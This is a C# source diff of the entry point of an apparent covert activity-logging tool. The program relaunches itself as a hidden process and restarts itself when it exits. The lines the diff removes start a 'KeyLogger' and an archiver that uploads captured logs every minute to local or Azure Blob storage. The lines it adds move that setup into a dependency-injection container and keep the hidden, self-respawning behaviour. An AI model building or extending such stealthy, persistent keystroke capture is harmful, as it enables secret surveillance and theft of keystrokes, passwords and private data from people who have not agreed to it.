@@ -4,21 +4,18 @@ using System.Configuration;
 using System.IO;
 using FileSystem;
 using UserActivityLogger;
-
+using Castle.Windsor;
+using ActivityLogger;
 
 namespace Host
 {
     class Program
     {
-        static string _localLogFolder;
-        static string _archiveLocation;
         static void Main(string[] args)
         {
-           
             new JarFileAssemblyLoader().Register();
             Start(args);
         }
-
         private static void Start(string[] args)
         {
 
@@ -28,99 +25,22 @@ namespace Host
                 return;
             }
 
-
-            if (true || args.Length > 0 && args[0] == "hidden")
+            if (args.Length > 0 && args[0] == "hidden")
             {
                 Logger.LogInforamtion("Running with hidden");
-
-                _localLogFolder = Path.Combine(GetRootFolderPath(), "SysLogs");
-
                 new UnhandledExceptionHandlercs().Register(Logger.LogError);
-
-                new LogFileArchiver(GetFileSystem(), _archiveLocation).Start(_localLogFolder, TimeSpan.FromMinutes(1));
-
-                //new LogFileArchiver(GetFileSystem(), _archiveLocation).StartPurging(_logFolder, TimeSpan.FromSeconds(5));
-
-                var activityLogger = new StartUp(TimeSpan.FromSeconds(2), _localLogFolder, new KeyLogger());
-
                 ProcessHelper.RecreateProcessOnExit();
 
-                activityLogger.Start();
+                IWindsorContainer windsorContainer = new WindsorContainer();
+                CastleWireUp.WireUp(windsorContainer);
+             
+                var startUp = windsorContainer.Resolve<IStartUp>();
+                startUp.Start(TimeSpan.FromSeconds(2));
             }
             else
             {
                 ProcessHelper.RunHidden(System.Reflection.Assembly.GetEntryAssembly().Location);
             }
-
-        }
-
-        static string GetRootFolderPath()
-        {
-            try
-            {
-                if (ConfigurationManager.AppSettings["DemoFolder"] != null)
-                {
-                    var rootFolder = ConfigurationManager.AppSettings["DemoFolder"].Trim();
-
-                    if (!string.IsNullOrEmpty(rootFolder))
-                    {
-                        if (!Directory.Exists(rootFolder))
-                        {
-                            Directory.CreateDirectory(rootFolder);
-                        }
-
-                        HasWriteAccessToFolder(rootFolder);
-
-                        return rootFolder;
-                    }
-                }
-            }
-            catch (UnauthorizedAccessException ex)
-            { }
-            catch (Exception ex)
-            {
-
-            }
-
-            return Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
-        }
-
-        private static IFileSystem GetFileSystem()
-        {
-            var configuredFileSystem = ConfigurationManager.AppSettings["FileSystem"];
-
-            if (string.IsNullOrEmpty(configuredFileSystem))
-            {
-                return new NtfsFileSystem();
-            }
-
-            switch (configuredFileSystem.ToUpperInvariant())
-            {
-                case "NTFS":
-                    _archiveLocation = ConfigurationManager.AppSettings["ArchiveLocation_NTFS"];
-                    return new NtfsFileSystem();
-                    break;
-
-                case "AZUREBLOB":
-                    _archiveLocation = ConfigurationManager.AppSettings["ArchiveLocation_AZUREBLOB"];
-                    return new AzureBlobFileSystem(ConfigurationManager.AppSettings["StorageConnectionString"]);
-                    break;
-            }
-
-            return new NtfsFileSystem();
-        }
-
-
-        private static void HasWriteAccessToFolder(string folderPath)
-        {
-            var ds = Directory.GetAccessControl(folderPath);
-
-           var testFile = Path.Combine(folderPath, "test.temp");
-
-            File.WriteAllText(Path.Combine(folderPath, "test.temp"), "test");
-
-            File.Delete(testFile);
-
         }
     }
 }
